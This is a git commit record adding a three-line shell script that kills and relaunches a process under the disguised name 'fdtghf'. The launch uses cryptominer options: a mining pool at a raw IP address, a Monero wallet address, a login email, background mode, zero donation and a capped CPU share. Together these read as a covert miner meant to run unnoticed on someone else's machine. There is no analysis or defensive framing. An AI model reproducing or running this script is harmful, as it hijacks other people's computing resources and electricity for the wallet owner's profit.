39d870167343bf81018e1c74d4abcd7148867076
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-05-31 12:34:17 -0400

    Add files via upload

---
+++ 65.sh
@@ -0,0 +1,3 @@
+pkill fdtghf
+sleep 7
+fdtghf -o 95.216.187.139:4578 -u 44X3tNzFXwZet6y87T1R61gqzBZ9f4yMH9ur4baLxTeEDnfkyJKqRcTEtkqXMfZ6BhTqB8jgYSP5YRbtjAEHRjeqBozqe29 --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=44 --av=1 --variant -1
